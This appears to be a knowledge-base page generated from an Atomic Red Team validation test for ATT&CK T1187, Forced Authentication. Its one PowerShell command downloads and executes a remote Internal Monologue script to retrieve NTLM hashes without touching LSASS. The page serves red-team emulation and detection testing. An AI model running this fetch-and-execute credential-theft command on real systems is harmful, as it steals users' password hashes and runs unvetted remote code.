---
atomic_guid: "7f06b25c-799e-40f1-89db-999c9cc84317"
title: "WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS"
framework: "atomic"
generated: "true"
attack_technique_id: "T1187"
attack_technique_name: "Forced Authentication"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1187/T1187.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "7f06b25c-799e-40f1-89db-999c9cc84317"
  - "WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS technique via function of WinPwn

## ATT&CK Mapping

- [[kb/attack/techniques/T1187-forced_authentication|T1187: Forced Authentication]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1187/T1187.yaml)
